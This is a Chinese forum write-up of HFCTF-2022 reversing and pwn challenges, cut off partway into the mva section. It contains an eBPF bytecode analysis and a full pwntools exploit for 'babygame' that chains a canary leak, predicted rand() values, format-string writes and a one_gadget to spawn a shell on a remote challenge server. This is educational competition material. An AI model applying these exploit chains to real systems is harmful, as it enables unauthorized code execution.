
# [CTF] [HFCTF-2022] 二进制方向部分题目详细题解

- 原帖: https://www.52pojie.cn/forum.php?mod=viewthread&tid=1613505
- 抓取时间: 2026-11-01T23:31:09

## 前言

姑且参加了比赛，赛题感觉都不错，适当做了个复现。PWN 那边还有一道内核没复现，主要是受限于目前笔者的技术水平，内核部分的知识还不太够用，以后有机会了会另外复现的。

最有意思的题目应该是 vdq 那题，属于是佩服做出来的师傅，那个最终的 `payload` 构造花了我一整天时间，整道题做了有两天半......怎么说呢，好痛苦啊。

另外 fpbe 和 mva 也挺好玩的，前者主要是给我科普了一波 ebpf，后者主要是笔者觉得自己写的 `exp` 挺精巧的，自我感觉还行。不过博客的模板似乎不识别五级标题，看着确实有点不舒服了......

也欢迎师傅们捉虫。

## REV

### fpbe

第一次接触 ebfp 的逆向，才知道其原理和分析方式（上次 D3 的那题 ebfp 没看）。

主要逻辑只有几行：

```
          err = uprobed_function(*array, array[1], array[2], array[3]);
            if ( err == 1 )
            printf("flag: HFCTF{%s}\n", flag, &flag[12], v7, v8, v9, argv);
          else
            puts("not flag");
```

但比赛的时候因为对 ebfp 的执行逻辑不熟悉，以及 IDA 动调的时候没能真正模拟其执行流，以至于没能顺利写完这道逆向签到题。

#### 执行逻辑

ebfp 通过 `bpf_program__attach_uprobe` 将上述 `uprobed_function` 函数 hook 掉了：

```
skel->links.uprobe = bpf_program__attach_uprobe(
    skel->progs.uprobe,
    0,
    0,
    "/proc/self/exe",
    uprobed_function - base_addr
);
```

当程序执行 `uprobed_function` 函数时，会通过内核的系统调用转移到 hook 的函数去。

跟踪 `skel` 向下：

```
fpbe_bpf__open_and_load->fpbe_bpf__open->
fpbe_bpf__open_opts->fpbe_bpf__create_skeleton
```

`fpbe_bpf__create_skeleton` 中创建 uprobe 的具体内容如下：

```
if ( s->progs )
{
    s->progs->name = "uprobe";
    s->progs->prog = &obj->progs.uprobe;
    s->progs->link = &obj->links.uprobe;
    s->data_sz = 1648LL;
    s->data = &unk_4F4018;
    result = 0;
}
```

其中 `data` 是最终的执行代码，`size` 为对应比特大小。

接下来用 `gdb` 将其加载到内存，然后就可以用 `bpftool` 去 dump 出具体内容了：(有删减)

```
   0: (79) r2 = *(u64 *)(r1 +104) //flag[2]
   3: (79) r3 = *(u64 *)(r1 +112) //flag[3]
   6: (bf) r4 = r3
   7: (27) r4 *= 28096
   8: (bf) r5 = r2
   9: (27) r5 *= 64392
  10: (0f) r5 += r4
  11: (79) r4 = *(u64 *)(r1 +96) //flag[1]
  14: (bf) r0 = r4
  15: (27) r0 *= 29179
  16: (0f) r5 += r0
  17: (79) r1 = *(u64 *)(r1 +88) //flag[0]

  24: (bf) r0 = r1
  25: (27) r0 *= 52366
  26: (0f) r5 += r0
  27: (b7) r6 = 1
  28: (18) r0 = 0xbe18a1735995
  30: (5d) if r5 != r0 goto pc+66
//0xbe18a1735995 == flag[0]*52366 + flag[1]*29179 + flag[2]*64392 + flag[3]*28096

  31: (bf) r5 = r3
  32: (27) r5 *= 61887
  33: (bf) r0 = r2
  34: (27) r0 *= 27365
  35: (0f) r0 += r5
  36: (bf) r5 = r4
  37: (27) r5 *= 44499
  38: (0f) r0 += r5
  39: (bf) r5 = r1
  40: (27) r5 *= 37508
  41: (0f) r0 += r5
  42: (18) r5 = 0xa556e5540340
  44: (5d) if r0 != r5 goto pc+52
//0xa556e5540340 == flag[0]*37508 + flag[1]*44499 + flag[2]*27365 + flag[3]*61887 

  45: (bf) r5 = r3
  46: (27) r5 *= 56709
  47: (bf) r0 = r2
  48: (27) r0 *= 32808
  49: (0f) r0 += r5
  50: (bf) r5 = r4
  51: (27) r5 *= 25901
  52: (0f) r0 += r5
  53: (bf) r5 = r1
  54: (27) r5 *= 59154
  55: (0f) r0 += r5
  56: (18) r5 = 0xa6f374484da3
  58: (5d) if r0 != r5 goto pc+38
//0xa6f374484da3 == flag[0]*59154 + flag[1]*25901 + flag[2]*32808 + flag[3]*56709 

  59: (bf) r5 = r3
  60: (27) r5 *= 33324
  61: (bf) r0 = r2
  62: (27) r0 *= 51779
  63: (0f) r0 += r5
  64: (bf) r5 = r4
  65: (27) r5 *= 31886
  66: (0f) r0 += r5
  67: (bf) r5 = r1
  68: (27) r5 *= 62010
  69: (0f) r0 += r5
  70: (18) r5 = 0xb99c485a7277
  72: (5d) if r0 != r5 goto pc+24
//0xb99c485a7277 == flag[0]*62010 + flag[1]*31886 + flag[2]*51779 + flag[3]*33324 
```

最后解一下上述方程组即可拿到 `flag`。

## PWN

### babygame

栈溢出先把 `srand` 的种子写掉，顺便泄露一个栈地址，然后就能算出之后的返回地址在栈中的位置了。然后用格式化字符串把返回地址写掉，再来一次格式化字符串。途中也顺便泄露一个 `libc` 地址，然后就能算出 `libc` 基址了，加上 `one_gadget` 再写回返回地址即可。

```
from pwn import *

import random

from ctypes import *

context.log_level='debug'

context.arch = "x86_64"

#p=process("./babygame",env={'LD_PRELOAD':'./libc-2.31.so'})

p=remote("120.25.205.249",37062)

#elf=ELF("./babygame")

libc = cdll.LoadLibrary('libc.so.6')

#gdb.attach(p,"b*$rebase(0x1435)\nc\n")

sla=lambda a,b:p.sendlineafter(a.encode(),b)

sa=lambda a,b:p.sendafter(a.encode(),b)

sa("name:","a"*256+"a"*8+"a")

p.recvuntil("Hello, ")

leakdata=p.recvuntil("\x0a")[-15:-1]

print((leakdata))

canary=u64(leakdata[:-6].ljust(8,"\x00"))-0x61

stack_test=u64(leakdata[8:].ljust(8,"\x00"))

print(hex(canary))

print(hex(stack_test))

ogd=[0xe3b2e,0xe3b31,0xe3b34]

libc.srand(0x61616161)

p.recvuntil("paper")

sleep(1)

for i in range(100):

    temp=libc.rand()%3

    print("now temp:"+hex(temp))

    if(temp==0):

        temp=1

    elif(temp==1):

        temp=2

    elif(temp==2):

        temp=0

    sla("round",str(temp))

offset=6

stack_ret=stack_test+(0x7ffcbd0edfd8-0x7ffcbd0ee1f0)

print(hex(stack_ret))

sleep(2)

payload="%62c"+"%8$hhn"+"%9$p%p"+p64(stack_ret)

sla("luck",payload)

sleep(2)

p.recvuntil("0x")

data=int("0x"+(p.recv(12)),16)

print(hex(data))

libc_base=data-(0x7fead012bd0a-0x7fead00ca000)

print(hex(libc_base))

one_gad=libc_base+ogd[1]

payload = fmtstr_payload(6, {stack_ret: one_gad},write_size='byte')

sla("luck",payload)

p.interactive()
```

### gogogo

这题没做出来实属不应该，真没想到出题人会用这么恶心人的方式混淆（指一个个字符打印，以及拐弯抹角地硬是把简单的栈溢出藏在尾巴，搞得我这种习惯从上往下分析的累得半死不活，还以为漏洞肯定会在那个选择输入或输出的地方，属实是被整无语了）......

主要是 golang 中传参的方式不太一样，其中有几个值得注意的输入函数，在我们恢复传参符号以后可以看见：

```
fmt_Fscanf("%d");
bufio___ptr_Reader__Read(qword_5514E0, v4, 0x200);
bufio___ptr_Reader__Read(qword_5514E0, buf, 0x800);
bufio___ptr_Reader__Read(qword_5514E0, v63, 0x20);
```

只需要在 IDA 中将这下函数的参数列表设定好，重新反编译即可看见。因为 golang 的传参方式和常规的 x86_64 不太一样，所以默认情况下 IDA 没有正常识别的参数。

然后就能注意到，有一个输入的长度是 `0x800`，而 `buf` 直接被 IDA 识别到了：

```
char buf[8]; // [rsp+70h] [rbp-460h] BYREF
```

而 `buf` 下面也没有很多缓冲区，所以直接让程序执行到这里，然后正常用 ROP 拿 shell 即可。

顺便一提，真正的主函数是 `math_init` 函数，出题人拐弯抹角的弄了很多混淆视听的东西。

输入序列如下：

- `1416925456`
- 通过游戏
- `E`
- `4`
- `payload`

`exp` 没太多技术含量，主要就是需要去跑那个小游戏，网上搜一下就能找到脚本了，所以这里就不放了。

### mva

#### 程序分析

逻辑很简单，输入虚拟机字节码然后就会开始执行了。

注意到 IDA 打开之后分析的错误，通过汇编就能发现是由于 `switch` 的优化符号表导致，适当修复符号表后可以得到如下反汇编代码：
